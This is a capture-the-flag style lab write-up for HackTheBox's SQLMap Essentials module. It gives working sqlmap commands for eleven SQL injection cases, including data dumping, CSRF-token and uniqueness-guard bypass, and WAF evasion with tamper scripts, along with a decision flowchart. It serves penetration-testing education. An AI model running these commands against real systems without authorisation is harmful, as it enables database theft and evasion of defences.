# SQLMap Essentials — Complete Write-Up (Cases 1–11)

> **Module**: SQLMap Essentials — HackTheBox  
> **Topic**: Detecting and exploiting SQL injection vulnerabilities using SQLMap  
> **Scope**: 11 progressive cases covering GET, POST, Cookie, JSON, OR-based, ORDER BY, UNION tuning, Anti-CSRF, Randomize, Step-by-step enumeration, and WAF bypass

---

## Table of Contents

- [Case 1 — GET Parameter (Basic)](#case-1--get-parameter-basic)
- [Case 2 — POST Parameter](#case-2--post-parameter)
- [Case 3 — Cookie Parameter](#case-3--cookie-parameter)
- [Case 4 — JSON Request](#case-4--json-request)
- [Case 5 — OR-Based SQLi (Time-Based Blind)](#case-5--or-based-sqli-time-based-blind)
- [Case 6 — ORDER BY Injection (Non-Standard Boundaries)](#case-6--order-by-injection-non-standard-boundaries)
- [Case 7 — UNION Columns Tuning](#case-7--union-columns-tuning)
- [Case 8 — Anti-CSRF Token Bypass](#case-8--anti-csrf-token-bypass)
- [Case 9 — Unique Value Bypass (--randomize)](#case-9--unique-value-bypass---randomize)
- [Case 10 — Step-by-Step Enumeration](#case-10--step-by-step-enumeration)
- [Case 11 — WAF Bypass with Tamper Scripts](#case-11--waf-bypass-with-tamper-scripts)
- [Decision Flow](#decision-flow)
- [Key Takeaways](#key-takeaways)

---

## Case 1 — GET Parameter (Basic)

**Target**: `http://154.57.164.69:31415/case1.php?id=1`

### What's happening

The application passes user input directly through a GET parameter (`id`) in the URL, with no sanitization. This is the most common and straightforward injection scenario: the value is interpolated into a SQL query without prepared statements.

### Command

```bash
sqlmap -u "http://154.57.164.69:31415/case1.php?id=1" --batch --random-agent
```

### Why these flags

| Flag | Reason |
|------|--------|
| `-u` | Specifies the target URL with the injectable parameter |
| `--batch` | Skips all interactive prompts, uses default answers automatically |
| `--random-agent` | Replaces SQLMap's default User-Agent (which is easily fingerprinted) with a random browser UA |

### Result

SQLMap identified **6 columns** in the query and found **5 injection types**: boolean-based blind, error-based, stacked queries, time-based blind, and UNION query.

---

## Case 2 — POST Parameter

**Target**: `http://154.57.164.69:31415/case2.php`

### What's happening

The injectable parameter (`id`) is sent in the **HTTP request body** via POST, not in the URL. SQLMap does not automatically detect POST parameters from a plain URL — they must be explicitly declared with `--data`.

### Command

```bash
sqlmap -u "http://154.57.164.69:31415/case2.php" --data 'id=1' --batch
```

### Why these flags

| Flag | Reason |
|------|--------|
| `--data` | Declares the POST body and its parameters for SQLMap to test |

### Result

SQLMap resumed a previous session and confirmed the injection, identifying **9 columns** in the target query.

---

## Case 3 — Cookie Parameter

**Target**: `http://154.57.164.69:31415/case3.php`

### What's happening

The injection point is inside an **HTTP cookie** (`id=1`). By default, SQLMap only tests GET and POST parameters — it ignores headers and cookies unless explicitly told to test them. The `*` marker is used to pinpoint the exact injection location within the cookie value.

### Command

```bash
sqlmap -u "http://154.57.164.69:31415/case3.php" --cookie="id=1*" --batch --random-agent
```

### Why these flags

| Flag | Reason |
|------|--------|
| `--cookie` | Passes the cookie header to SQLMap |
| `*` (asterisk) | Marks the exact position where SQLMap should inject — without it, SQLMap ignores the cookie entirely and returns "no parameter(s) found" |

### Result

Injection confirmed inside the cookie parameter. Without the `*` marker, this case would be missed entirely.

> **Lesson**: Whenever the injection point is in a header or cookie, always use `*` to mark the position explicitly.

---

## Case 4 — JSON Request

**Target**: `http://154.57.164.69:31415/case4.php`

### What's happening

The application accepts input in **JSON format** via a POST request body. Passing JSON through `--data` on the command line is error-prone and unreliable — the correct approach is to capture the raw HTTP request and feed it to SQLMap via a file.

### Captured request (`req.txt`)

```http
POST /case4.php HTTP/1.1
Host: 154.57.164.69:31415
Content-Type: application/json

{"id":1}
```

### Command

```bash
sqlmap -r req.txt --batch --random-agent
```

### Why these flags

| Flag | Reason |
|------|--------|
| `-r` | Loads the full HTTP request from a file, preserving all headers and body format |

SQLMap detects the JSON content type and prompts to process it — `--batch` automatically confirms.

### Result

Injection found in the JSON parameter `id`.

> **Lesson**: For any complex request (JSON, XML, multipart, long headers), always use `-r` with a captured request file. The fastest way to generate it is right-clicking the request in the browser DevTools → "Copy as cURL", then saving it.

---

## Case 5 — OR-Based SQLi (Time-Based Blind)

**Target**: `http://154.57.164.74:32672/case5.php?id=1`

### What's happening

The vulnerable SQL statement is one where only **OR-based payloads** trigger detectable behavior. SQLMap avoids OR payloads by default because they can unintentionally modify database content (for example, `OR 1=1` inside a `DELETE` or `UPDATE` would wipe or alter every row). To unlock OR payloads, `--risk=3` must be explicitly set.

Additionally, the detection relies on **time-based blind** technique (the server delays its response when the condition is true), which is sensitive to network latency. With high latency, SQLMap may misread a slow network response as a positive injection signal — `--time-sec=10` extends the expected delay threshold to compensate.

### Command

```bash
sqlmap -u "http://154.57.164.74:32672/case5.php?id=1" \
  --level=5 --risk=3 \
  -T flag5 --no-cast \
  --time-sec=10 --fresh-queries \
  --dump --batch
```

### Why these flags

| Flag | Reason |
|------|--------|
| `--level=5` | Maximizes the number of boundaries and payload combinations tested |
| `--risk=3` | Unlocks OR-based payloads (disabled by default to avoid modifying DB data) |
| `-T flag5` | Targets only the `flag5` table, skipping full enumeration |
| `--no-cast` | Prevents SQLMap from type-casting extracted data, which can corrupt string values like flags |
| `--time-sec=10` | Sets the time-based blind detection threshold to 10 seconds, accounting for network latency |
| `--fresh-queries` | Ignores cached results from previous runs and retests from scratch |

### Result

Flag successfully extracted from the `flag5` table.

> **Lesson**: OR-based injection is the default behavior for login bypass attacks (`OR 1=1`). In any scenario that suggests OR-based injection (login forms, search fields that always return results), force `--risk=3`. Combine with `--time-sec` when the network connection is unstable.

---

## Case 6 — ORDER BY Injection (Non-Standard Boundaries)

**Target**: `http://154.57.164.74:32672/case6.php?col=id`

### What's happening

The parameter `col` is not a **value** in the SQL query — it is a **column name**, injected directly into an `ORDER BY` clause or used as a column identifier inside backtick delimiters:

```sql
SELECT * FROM users ORDER BY `col`
-- or
SELECT * FROM users WHERE `col` = 1
```

Standard SQLMap payloads (with single quotes, double quotes, numeric conditions) do not break this syntax because `ORDER BY 'id'` is syntactically valid SQL and produces no error. The injection must occur **after the closing backtick** of the column name — which SQLMap's default boundaries don't cover.

The `--prefix` flag closes the open backtick before injecting the vector.

### Reconnaissance

Testing manually in the browser first:
- `col=name` → empty page (no error) → confirms `col` is used as a column identifier, not a value
- `col=id'` → still no error → standard string boundaries don't break the query
- `col=id DESC` / `col=id ASC` → no visible change → ORDER BY hypothesis weakened

This confirmed non-standard boundaries requiring a custom prefix.

### Command

```bash
sqlmap -u "http://154.57.164.74:32672/case6.php?col=id" \
  --prefix='`' \
  --level=5 --risk=3 \
  --dump --batch --random-agent
```

> **Shell note**: The backtick must be wrapped in **single quotes** (`'`), not double quotes. In bash, backticks inside double quotes are interpreted as command substitution and break the command.

### Why these flags

| Flag | Reason |
|------|--------|
| `--prefix='`'` | Closes the open backtick delimiter before injecting the SQL vector |
| `--level=5 --risk=3` | Expands boundary and payload coverage for non-standard injection points |

### Result

Flag extracted successfully.

> **Lesson**: Whenever a parameter looks like a column or table name (not a value), test it manually first. If single quotes cause no error, suspect `ORDER BY` or backtick-delimited column name injection. Use `--prefix` to manually close the delimiter before the payload.

---

## Case 7 — UNION Columns Tuning

**Target**: `http://154.57.164.74:32672/case7.php?id=1`

### What's happening

The vulnerability is a standard **UNION-based injection**, but SQLMap's automatic column count detection (via `ORDER BY`) is slow or unreliable in this case. Since the number of columns is already visible in the page output (5 columns rendered: `id`, `name`, `birthday`, `occupation`, `phone`), it can be provided directly to SQLMap with `--union-cols`, skipping the entire enumeration phase.

### Command

```bash
sqlmap -u "http://154.57.164.74:32672/case7.php?id=1" \
  --union-cols=5 --no-cast \
  --dump --batch
```

### Why these flags

| Flag | Reason |
|------|--------|
| `--union-cols=5` | Tells SQLMap the query has exactly 5 columns, skipping `ORDER BY` enumeration |
| `--no-cast` | Prevents type casting that could corrupt the flag's string value |

### Result

Flag extracted with a faster, more precise scan.

> **Lesson**: Always count the columns rendered in the page before running SQLMap on a UNION-based target. Providing `--union-cols` directly eliminates one of the slowest phases of UNION detection.

---

## Case 8 — Anti-CSRF Token Bypass

**Target**: `http://154.57.164.68:30636/case8.php`

### What's happening

The application uses an **anti-CSRF token** (`t0ken`) that is regenerated with every request. Each SQLMap request without a valid, fresh token is rejected by the server with "Wrong token". The `--csrf-token` flag tells SQLMap to automatically extract the current token from the page response and include it in the next request.

### Command

```bash
# Option A — inline
sqlmap -u "http://154.57.164.68:30636/case8.php" \
  --data="id=1&t0ken=INITIAL_VALUE" \
  --csrf-token="t0ken" \
  --dump --batch

# Option B — from captured request file (more reliable)
sqlmap -r req8.txt --csrf-token="t0ken" --dump --batch
```

### Why these flags

| Flag | Reason |
|------|--------|
| `--csrf-token="t0ken"` | Instructs SQLMap to parse the response for the named token and re-include its updated value in every subsequent request |

### Result

Token refreshed automatically on every request, injection confirmed.

> **Lesson**: Look for parameters named `csrf`, `xsrf`, `token`, `nonce`, `_token`, or similar in forms. Any parameter that changes between requests and causes a "wrong token" / "invalid request" error needs `--csrf-token`.

---

## Case 9 — Unique Value Bypass (`--randomize`)

**Target**: `http://154.57.164.68:30636/case9.php?id=1&uid=1445780380`

### What's happening

The `uid` parameter must have a **unique value on every request**. The server tracks seen values and blocks repeated ones, causing SQLMap to fail silently when it reuses the same `uid` across its test requests. The `--randomize` flag generates a new random value for the specified parameter on every request.

### Command

```bash
sqlmap -u "http://154.57.164.68:30636/case9.php?id=1&uid=1445780380" \
  --randomize=uid \
  --dump --batch
```

### Why these flags

| Flag | Reason |
|------|--------|
| `--randomize=uid` | Generates a new random value for `uid` with each request, bypassing uniqueness enforcement |

### Result

Bypass successful, injection confirmed on the `id` parameter.

> **Lesson**: Long numeric parameters like `uid`, `nonce`, `rand`, or `timestamp` that look auto-generated are often uniqueness guards. If the server blocks repeated values, use `--randomize`.

---

## Case 10 — Step-by-Step Enumeration

**Target**: `http://154.57.164.68:30636/case10.php`

### What's happening

This case combines previous techniques (POST, unique values, complex headers) and introduces the correct **methodology for real-world enumeration**: instead of jumping straight to `--dump`, you progressively map the database structure before extracting data.

### Workflow

```bash
# Step 1 — Capture the request with Burp/DevTools and save it as req10.txt

# Step 2 — Map the full database schema (all tables and columns)
sqlmap -r req10.txt --schema --batch

# Step 3 — List tables in the identified database
sqlmap -r req10.txt -D target_db --tables --batch

# Step 4 — List columns of the target table
sqlmap -r req10.txt -D target_db -T flag10 --columns --batch

# Step 5 — Extract the data
sqlmap -r req10.txt -D target_db -T flag10 --dump --batch
```

### Final command (if uid randomization is needed)

```bash
sqlmap -r req10.txt --randomize=uid --dump --batch
```

### Result

Flag extracted after progressive enumeration.

> **Lesson**: There is no single magic command. In a real penetration test, you always enumerate progressively: schema → tables → columns → data. Jumping to `--dump` blindly wastes time and can produce incomplete results.

---

## Case 11 — WAF Bypass with Tamper Scripts

**Target**: `http://154.57.164.68:30636/case11.php?id=1`

### What's happening

A **Web Application Firewall (WAF)** is blocking SQLMap's payloads before they reach the application. Standard injection attempts return blocked responses. Tamper scripts transform SQLMap's payloads at the syntax level — rewriting operators, randomizing case, encoding characters — to evade pattern-based WAF signatures without changing the underlying SQL logic.

### Command

```bash
sqlmap -u "http://154.57.164.68:30636/case11.php?id=1" \
  --tamper=between,randomcase \
  --dump --batch
```

### Why these tamper scripts

| Tamper | What it does | When to use |
|--------|-------------|-------------|
| `between` | Replaces `>` with `NOT BETWEEN 0 AND` and `=` with `BETWEEN # AND #` | When comparison operators are filtered |
| `randomcase` | Randomizes letter casing (`SELECT` → `SeLeCt`) | When the WAF does case-sensitive keyword matching |
| `space2comment` | Replaces spaces with `/**/` | When spaces are stripped |
| `space2dash` | Replaces spaces with `--\n` | Alternative to `space2comment` |
| `equaltolike` | Replaces `=` with `LIKE` | When `=` is blocked |
| `base64encode` | Base64-encodes the payload | When the WAF blocks all readable payloads |
| `symboliclogical` | Replaces `AND`/`OR` with `&&`/`\|\|` | When logical keywords are filtered |

### List all available tamper scripts

```bash
sqlmap --list-tampers
```

### Result

WAF bypassed, injection confirmed.

> **Lesson**: Tamper scripts can be chained (comma-separated). Start with `between,randomcase` as a baseline. If still blocked, inspect which part of the payload is triggering the WAF (use `-v 3`) and add the appropriate tamper.

---

## Decision Flow

```
Default scan fails?
│
├── Server returns "Wrong token" / "Invalid request"?
│   └── --csrf-token="token_name"                          → Case 8
│
├── Parameter with long numeric value (uid, nonce, rand)?
│   └── --randomize=param_name                             → Case 9
│
├── POST request with JSON / XML / complex headers?
│   └── -r req.txt + progressive enumeration               → Case 4, 10
│
├── Cookie contains the injection point?
│   └── --cookie="param=value*"                            → Case 3
│
├── Single quote causes no error (200 OK, no change)?
│   ├── Parameter looks like a column name?
│   │   └── --prefix='`' --level=5 --risk=3               → Case 6
│   └── ORDER BY / non-standard syntax suspected?
│       └── --prefix + --suffix with custom delimiters     → Case 6
│
├── OR-based injection suspected (login page, always-true behavior)?
│   └── --risk=3 --level=5 (+ --time-sec=10 if slow)      → Case 5
│
├── Number of columns visible in page output?
│   └── --union-cols=N --no-cast                           → Case 7
│
└── WAF blocking payloads?
    └── --tamper=between,randomcase (chain as needed)      → Case 11
```

---
